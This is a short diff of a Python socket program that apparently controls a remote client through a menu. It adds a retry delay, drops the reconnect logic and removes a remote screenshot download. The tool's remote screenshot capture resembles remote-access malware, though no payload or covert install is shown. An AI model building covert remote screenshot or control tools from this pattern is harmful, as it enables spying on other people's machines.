@@ -42,8 +42,10 @@ def establish_connection(address, time_out=None):
 
         except OSError as os_err:
             if os_err.errno == 48:
+                time.sleep(10)
                 continue
-            close_connection(conn_to_client)
+            
+
 
 
 def recv(time_out=None, sock=None, is_authed=None, buff_size=1024):
@@ -242,7 +244,6 @@ def main():
 
             elif choice == "2":
                 print("\nTaking Screenshot...")
-                download_file(file_name=f"{time.asctime()}.png", buff_size=65538)
 
             elif choice == "3":
                 pass
@@ -256,11 +257,10 @@ def main():
         except KeyboardInterrupt:
             break
 
-        except (ConnectionError, BrokenPipeError) as e:
-            print("Connection lost, attempting to reconnect...")
-            print(e)
-            conn_to_client = reset_connection(time_out=15)
-            continue
+        except (ConnectionError, BrokenPipeError, socket.error) as e:
+            print("Connection lost")
+            break
+            
 
     close_connection(conn_to_client)
     print('Exiting...')
